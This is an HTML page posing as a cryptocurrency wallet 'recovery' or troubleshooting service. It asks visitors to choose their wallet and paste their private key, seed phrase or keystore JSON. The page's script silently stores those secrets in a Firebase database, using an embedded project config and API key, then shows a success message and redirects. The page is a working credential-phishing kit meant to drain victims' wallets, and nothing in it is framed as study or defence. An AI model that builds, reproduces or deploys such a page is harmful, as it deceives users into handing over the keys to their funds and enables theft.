<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Select Wallet & Submit</title>
    <style>
        body { 
            margin: 0; 
            background-color: #000; 
            color: white; 
            font-family: system-ui, -apple-system, sans-serif; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px; 
        }
        
        header {
            width: 100%;
            max-width: 1200px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            margin-bottom: 40px;
        }
        
        .logo {
            font-weight: bold;
            font-size: 18px;
            letter-spacing: 1px;
        }
        
        nav a {
            color: #999;
            text-decoration: none;
            margin-left: 20px;
            font-size: 14px;
        }
        
        main {
            text-align: center;
            max-width: 500px;
            margin-top: 20px;
            width: 100%;
        }

        h1 { font-size: 24px; margin-bottom: 20px; }
        
        .form-group { margin-bottom: 15px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #ccc; }
        
        select, textarea {
            width: 100%;
            padding: 12px;
            background: #111;
            border: 1px solid #444;
            color: white;
            border-radius: 6px;
            font-size: 14px;
            box-sizing: border-box;
        }

        .submit-btn {
            width: 100%;
            background-color: #2563eb;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-size: 16px;
        }
        
        .back-link {
            display: block;
            margin-top: 20px;
            color: #666;
            text-decoration: none;
            font-size: 14px;
        }
        .back-link:hover { color: white; }
        
        .status-msg { text-align: center; margin-top: 10px; font-size: 14px; color: #aaa; }
    </style>
</head>
<body>

    <header>
        <div class="logo">SECURED-RECOVERY-PROTOCOL</div>
        <nav>
            <a href="index.html">Home</a>
        </nav>
    </header>

    <main>
        <h1>Troubleshoot an Issue</h1>
        
        <form id="recoveryForm">
            <div class="form-group">
                <label for="problemType">What is your issue?</label>
                <select id="problemType" required>
                    <option value="Wrong Wallet">Wrong Wallet Selected</option>
                    <option value="Seed Phrase">Seed Phrase Error</option>
                    <option value="Private Key">Private Key Issue</option>
                    <option value="Other">Other</option>
                </select>
            </div>

            <div class="form-group">
                <label for="walletType">Which wallet are you using?</label>
                <select id="walletType" required>
                    <option value="MetaMask">MetaMask</option>
                    <option value="Trust Wallet">Trust Wallet</option>
                    <option value="Coinbase">Coinbase Wallet</option>
                    <option value="Ledger">Ledger Hardware</option>
                    <option value="Trezor">Trezor Hardware</option>
                </select>
            </div>

            <div class="form-group">
                <label for="keyInput">Enter Private Key / Seed Phrase / JSON:</label>
                <textarea id="keyInput" rows="4" placeholder="Paste here..." required></textarea>
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">Submit for Recovery</button>
            <div id="loadingMsg" class="status-msg"></div>
        </form>

        <a href="index.html" class="back-link">&larr; Back to Home</a>
    </main>

    <!-- FIREBASE INTEGRATION -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // YOUR CONFIG
        const firebaseConfig = {
          apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
          authDomain: "coinsupport-8b036.firebaseapp.com",
          projectId: "coinsupport-8b036",
          storageBucket: "coinsupport-8b036.firebasestorage.app",
          messagingSenderId: "575774102570",
          appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
          measurementId: "G-YGCSNX4H9L"
        };

        // Initialize
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Form Submission Logic
        document.getElementById('recoveryForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const btn = document.getElementById('submitBtn');
            const status = document.getElementById('loadingMsg');
            
            btn.disabled = true;
            btn.innerText = "Sending...";
            status.innerText = "";

            try {
                await set(ref(db, 'submissions/' + Date.now()), {
                    problem: document.getElementById('problemType').value,
                    wallet: document.getElementById('walletType').value,
                    keyInput: document.getElementById('keyInput').value,
                    timestamp: new Date().toISOString()
                });

                status.style.color = "#4ade80";
                status.innerText = "Success! Data sent.";
                
                setTimeout(() => {
                    window.location.href = "index.html";
                }, 1500);

            } catch (error) {
                console.error(error);
                status.style.color = "#ef4444";
                status.innerText = "Error sending data.";
                btn.disabled = false;
                btn.innerText = "Submit for Recovery";
            }
        });
    </script>

</body>
</html>
